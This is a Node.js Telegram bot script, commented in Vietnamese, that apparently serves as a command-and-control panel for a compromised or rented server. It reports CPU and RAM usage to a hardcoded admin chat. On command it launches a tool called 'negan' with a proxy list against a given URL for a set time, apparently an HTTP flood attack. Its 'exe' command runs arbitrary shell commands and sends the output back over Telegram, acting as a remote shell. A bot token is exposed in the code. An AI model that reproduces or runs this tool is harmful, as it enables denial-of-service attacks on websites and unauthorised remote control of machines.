const TelegramBot = require('node-telegram-bot-api'), { exec } = require('child_process'), os = require('os');
const token = '7534473375:AAFuC9Vb9wS8Vzb1Bq_TNagZQNxh9GAl0MI', bot = new TelegramBot(token, { polling: true }), adminId = 7371969470;

// Hàm lấy thông số CPU và RAM
const getSystemStats = () => {
    const totalMemory = os.totalmem(), freeMemory = os.freemem(), usedMemory = totalMemory - freeMemory;
    const memoryUsagePercent = ((usedMemory / totalMemory) * 100).toFixed(2);
    const cpuUsagePercent = (os.cpus().reduce((acc, cpu) => {
        const total = Object.values(cpu.times).reduce((a, b) => a + b, 0), idle = cpu.times.idle;
        return acc + (100 - (idle / total) * 100);
    }, 0) / os.cpus().length).toFixed(2);
    return { memoryUsagePercent, cpuUsagePercent, totalMemory: (totalMemory / 1024 / 1024 / 1024).toFixed(0), freeMemory: (freeMemory / 1024 / 1024 / 1024).toFixed(0) };
};

// Gửi thông số CPU và RAM mỗi 14 giây
setInterval(() => {
    const stats = getSystemStats(), cpuFreePercent = (100 - parseFloat(stats.cpuUsagePercent)).toFixed(2);
    bot.sendMessage(adminId, `Thông số đã sử dụng: 🚀\n- CPU đã sử dụng: ${stats.cpuUsagePercent}%\n- RAM đã sử dụng: ${stats.memoryUsagePercent}%\n\nThông số còn trống: ❤️\n- CPU còn trống: ${cpuFreePercent}%\n- RAM còn trống: ${stats.freeMemory}GB\n- Tổng RAM: ${stats.totalMemory}GB`);
}, 14000);

// Xử lý lệnh từ admin
bot.on('message', (msg) => {
    const chatId = msg.chat.id, text = msg.text;
    if (chatId !== adminId) return bot.sendMessage(chatId, 'Bạn không có quyền thực hiện lệnh này.');

    // Xử lý lệnh dạng "https://muahack.com/ 10"
    if (text.startsWith('http')) {
        const parts = text.split(' ');
        if (parts.length !== 2 || isNaN(parts[1])) return bot.sendMessage(chatId, 'Sai định dạng! Nhập theo: <URL> <time>.');
        const [host, time] = parts, command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
        console.log(`[DEBUG] Lệnh được thực thi: ${command}`);
        bot.sendMessage(chatId, `🚀 Đang thực thi lệnh: \`${command}\``);
        const child = exec(command);
        let output = '';
        child.stdout.on('data', (data) => output += data.toString());
        child.stderr.on('data', (data) => output += data.toString());
        child.on('close', () => bot.sendMessage(chatId, `🚀 Kết quả lệnh: \`${command}\`\n\`\`\`\n${output}\n\`\`\``, { parse_mode: 'Markdown' }));
        return;
    }

    // Xử lý lệnh bắt đầu bằng "exe"
    if (text.startsWith('exe ')) {
        const command = text.slice(4).trim();
        if (!command) return bot.sendMessage(chatId, 'Lệnh không được để trống. Ví dụ: "exe ls"');
        console.log(`[DEBUG] Lệnh được thực thi: ${command}`);
        bot.sendMessage(chatId, `🚀 Đang thực thi lệnh: \`${command}\``);
        const child = exec(command);
        let output = '';
        child.stdout.on('data', (data) => output += data.toString());
        child.stderr.on('data', (data) => output += data.toString());
        child.on('close', () => bot.sendMessage(chatId, `🚀 Kết quả lệnh: \`${command}\`\n\`\`\`\n${output}\n\`\`\``, { parse_mode: 'Markdown' }));
        return;
    }

    // Nếu lệnh không hợp lệ
    bot.sendMessage(chatId, 'Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.');
});
